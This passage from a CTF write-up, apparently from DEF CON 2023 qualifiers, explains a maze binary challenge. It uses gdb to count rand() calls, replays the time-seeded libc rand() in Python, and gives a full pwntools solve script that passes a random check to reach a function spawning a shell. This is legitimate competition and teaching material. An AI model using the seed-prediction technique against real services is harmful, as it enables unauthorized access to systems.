&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;system&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/sh&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;exit&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;However, the catch is that apart from solving the maze, we must also pass a random check, and if we don&amp;rsquo;t, we die. So previously, we were dying because &lt;code&gt;rand() % 1213&lt;/code&gt; was not equal to &lt;code&gt;1212&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#a6e22e&#34;&gt;rand&lt;/span&gt;() &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1213&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1212&lt;/span&gt; )
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;puts&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;You successfully exit the maze!&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;winner&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#a6e22e&#34;&gt;puts&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Just as you are about to exit, a displacer beast captures you. You die.&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#a6e22e&#34;&gt;exit&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Fortunately, the &lt;code&gt;rand()&lt;/code&gt; seed is set to the current time with &lt;code&gt;srand()&lt;/code&gt; at the start of the program.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;srand&lt;/span&gt;(v3);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Therefore our method to solve the challenge would be:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Figure out how to solve the maze (Done)&lt;/li&gt;
&lt;li&gt;Mimic the &lt;code&gt;rand()&lt;/code&gt; function in our script by seeding with the same time&lt;/li&gt;
&lt;li&gt;Keep track of the number of &lt;code&gt;rand()&lt;/code&gt; calls&lt;/li&gt;
&lt;li&gt;Find a way to call &lt;code&gt;rand()&lt;/code&gt;, and call it additional times until the next call results in &lt;code&gt;rand() % 1213 == 1212&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Doing a search in the decompiled code, we see functions &lt;code&gt;rand_range()&lt;/code&gt; and &lt;code&gt;randomDescription()&lt;/code&gt; each call &lt;code&gt;rand()&lt;/code&gt; once when ran.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__fastcall&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;rand_range&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; a1, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; a2)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)(&lt;span style=&#34;color:#a6e22e&#34;&gt;rand&lt;/span&gt;() &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; (a2 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; a1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; a1);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;randomDescription&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  v2[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;)&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cozy&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  v2[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;)&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;medium-sized&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  v2[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;)&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;spacious&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  v0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;rand&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;printf&lt;/span&gt;(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;As you step into the room, you find yourself standing in a %s space. The walls are adorned with %s and a two large %&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;s dominate the center of the room. You see %d flowers in a vase, and through a window you stop to count %d stars. Th&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e room appears well designed in the %s style.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; v5 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;__readfsqword&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x28u&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;randomDescription()&lt;/code&gt; is called every time we move, &lt;strong&gt;even if our move/input is invalid&lt;/strong&gt;. This means we can call &lt;code&gt;rand()&lt;/code&gt; once ourselves by inputting something that&amp;rsquo;s not a command.&lt;/p&gt;
&lt;p&gt;Lets debug with &lt;a href=&#34;https://github.com/pwndbg/pwndbg&#34;&gt;&lt;code&gt;pwndbg&lt;/code&gt;&lt;/a&gt; to figure out how many times &lt;code&gt;rand()&lt;/code&gt; is called when generating the maze.&lt;/p&gt;
&lt;p&gt;We start the binary and immediately break with &lt;code&gt;starti&lt;/code&gt;, and place a breakpoint after &lt;code&gt;generate_maze()&lt;/code&gt;:&lt;/p&gt;

  &lt;img src=&#34;./img/starti.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;&#34;  /&gt;


&lt;p&gt;&lt;a href=&#34;&#34;&gt;&lt;/a&gt;&lt;/p&gt;

  &lt;img src=&#34;./img/break.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;&#34;  /&gt;


&lt;p&gt;Then, we set a breakpoint at &lt;code&gt;rand()&lt;/code&gt;, and write a simpe python counter to keep track of how many times &lt;code&gt;rand()&lt;/code&gt; was called (which was how many times the breakpoint was triggered)&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;counter &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;breakpoint_handler&lt;/span&gt;(event):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;global&lt;/span&gt; counter
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    counter &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;srand called. total times called: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;counter&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;gdb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;events&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;stop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;connect(breakpoint_handler)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;end
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;./img/gdbpythoncool.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;&#34;  /&gt;


&lt;p&gt;And we find &lt;code&gt;generate_maze()&lt;/code&gt; hits the breakpoint &lt;code&gt;590&lt;/code&gt; times (the &lt;code&gt;591&lt;/code&gt; in the bottom of image is when it hits the breakpoint after &lt;code&gt;generate_maze()&lt;/code&gt; in &lt;code&gt;main()&lt;/code&gt;, so doesn&amp;rsquo;t count).&lt;/p&gt;
&lt;p&gt;Now that we have the amount of times &lt;code&gt;rand()&lt;/code&gt; is called, we can simulate this in python to predict what number the next &lt;code&gt;rand()&lt;/code&gt; call will yield.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; ctypes &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; CDLL
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;libc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; CDLL(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./libc.so.6&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;srand(int(time&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;time()))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;callrand&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;rand() &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1213&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# simulate rand() calls in generate_maze()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;590&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    callrand()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;callrand() &lt;span style=&#34;color:#75715e&#34;&gt;# the initial random message it sends&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; moves &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; solution:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    callrand() &lt;span style=&#34;color:#75715e&#34;&gt;# simulate rand() call in the random message we get after every input&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(moves)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now, after integrating the random calls into our solve script, we can stop before exiting the maze, keep calling &lt;code&gt;rand()&lt;/code&gt; by submitting an invalid input, until the next &lt;code&gt;callrand()&lt;/code&gt; we simulate yields &lt;code&gt;1212&lt;/code&gt;. When it does, we can finally exit the maze, and &lt;code&gt;winner()&lt;/code&gt; should be called, giving us a shell!&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;lastmove &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; solution[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; moves &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; solution[:&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]: &lt;span style=&#34;color:#75715e&#34;&gt;# do all moves except last&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    callrand() &lt;span style=&#34;color:#75715e&#34;&gt;# simulate rand() call in the random message we get after every input&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(moves)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nextrand &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; callrand()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; nextrand &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1212&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# send invalid input to call rand()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    nextrand &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; callrand()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(lastmove)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Final solve script:&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;4&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;4&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;solve.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-py&#34; &gt;&lt;code&gt;
class MazeSolver:
    def __init__(self, maze):
        self.maze = maze
        self.rows = len(maze)
        self.cols = len(maze[0])
        self.visited = [[False for _ in range(self.cols)] for _ in range(self.rows)]
        self.directions = {&amp;#39;N&amp;#39;: (-1, 0), &amp;#39;S&amp;#39;: (1, 0), &amp;#39;W&amp;#39;: (0, -1), &amp;#39;E&amp;#39;: (0, 1)}
        self.path = []

    def solve(self, start_row, start_col):
        if self._dfs(start_row, start_col):
            return self._get_solution()
        else:
            return []

    def _dfs(self, row, col):
        if not self._is_valid(row, col):
            return False

        self.visited[row][col] = True
        self.path.append((row, col))

        if self.maze[row][col] == &amp;#39;*&amp;#39;:
            return True

        for direction in self.directions.values():
            next_row = row &amp;#43; direction[0]
            next_col = col &amp;#43; direction[1]
            if self._dfs(next_row, next_col):
                return True

        self.path.pop()
        return False

    def _is_valid(self, row, col):
        if row &amp;lt; 0 or row &amp;gt;= self.rows or col &amp;lt; 0 or col &amp;gt;= self.cols:
            return False
        if self.maze[row][col] == &amp;#39;#&amp;#39; or self.visited[row][col]:
            return False
        return True

    def _get_solution(self):
        solution = []
        for i in range(1, len(self.path)):
            prev_row, prev_col = self.path[i-1]
            curr_row, curr_col = self.path[i]
            if curr_row &amp;lt; prev_row:
                solution.append(&amp;#39;n&amp;#39;)
            elif curr_row &amp;gt; prev_row:
                solution.append(&amp;#39;s&amp;#39;)
            elif curr_col &amp;lt; prev_col:
                solution.append(&amp;#39;w&amp;#39;)
            elif curr_col &amp;gt; prev_col:
                solution.append(&amp;#39;e&amp;#39;)
        return solution


from pwn import *
from ctypes import CDLL
import time

libc = CDLL(&amp;#34;./libc.so.6&amp;#34;)


def callrand():
    return libc.rand() % 1213

elf = context.binary = ELF(&amp;#34;./challenge&amp;#34;)

# seed with the current time right before starting the program
libc.srand(int(time.time())) 
p = process()

# simulate rand() calls in generate_maze()
for _ in range(590):
    callrand()

callrand() # the initial random message it sends

p.recvuntil(b&amp;#34;Which would you like to do?&amp;#34;)
p.sendline(b&amp;#34;a&amp;#34;)
p.recvuntil(b&amp;#34;You cast arcane eye and send your summoned magical eye above the maze.&amp;#34;)

maze = p.recvuntil(b&amp;#34;You&amp;#34;, drop=True).decode().split(&amp;#34;\n&amp;#34;)
maze = [i for i in maze if &amp;#34;.&amp;#34; in i or &amp;#34;#&amp;#34; in i] # scuffed method to get maze
maze = maze[1:]

solver = MazeSolver(maze)
solution = solver.solve(0, 1)

lastmove = solution[-1]

for moves in solution[:-1]: # do all moves except last
    callrand() # simulate rand() call in the random message we get after every input
    p.sendline(moves)

nextrand = callrand()
while not nextrand == 1212:
    p.sendline(b&amp;#34;x&amp;#34;) # send invalid input to call rand()
    nextrand = callrand()

p.sendline(lastmove)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;Running the final script we indeed get a shell, and solve the challenge!&lt;/p&gt;

  &lt;img src=&#34;./img/shell.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;&#34;  /&gt;


&lt;p&gt;To recieve our points, we had to submit a &lt;code&gt;.tar&lt;/code&gt; file with a Dockerfile and the solve script, which should run &lt;code&gt;./submitter&lt;/code&gt; after getting a shell, and print the flag. However, since I didn&amp;rsquo;t use any &lt;code&gt;p.recv()&lt;/code&gt; after sending the moves, the buffer would crash the docker and the submission would fail. Fortunately, one of my teammates &lt;a href=&#34;https://github.com/zafirr31&#34;&gt;Zafirr&lt;/a&gt; submitted with &lt;code&gt;p.sendlineafter()&lt;/code&gt; to overcome the issue and we got the points :)&lt;/p&gt;
&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;I would like to thank all my teammates for putting in all their effort playing the CTF, and especially &lt;a href=&#34;https://github.com/zafirr31&#34;&gt;&lt;code&gt;Zafirr&lt;/code&gt;&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/KebabTM&#34;&gt;&lt;code&gt;KebabTM&lt;/code&gt;&lt;/a&gt;, &lt;a href=&#34;https://eth007.me/blog/&#34;&gt;&lt;code&gt;Eth007&lt;/code&gt;&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/ainsetin&#34;&gt;&lt;code&gt;Ainsetin&lt;/code&gt;&lt;/a&gt; and &lt;code&gt;Goldenboy&lt;/code&gt; (sorry if i missed anyone) for helping me figure things out (especially the &lt;code&gt;rand()&lt;/code&gt; calls) while I wrote the solve script to solve this challenge!&lt;/p&gt;
&lt;p&gt;It was fun playing with a lot of people, and for the second day I met up with some of my teammates to solve more challenges - you can see &lt;a href=&#34;https://twitter.com/toasterpwn&#34;&gt;&lt;code&gt;toasterpwn&lt;/code&gt;&lt;/a&gt;&amp;rsquo;s writeup on them &lt;a href=&#34;https://toasterpwn.github.io/posts/defcon-ctf-2023-qualifiers/&#34;&gt;here&lt;/a&gt;!&lt;/p&gt;
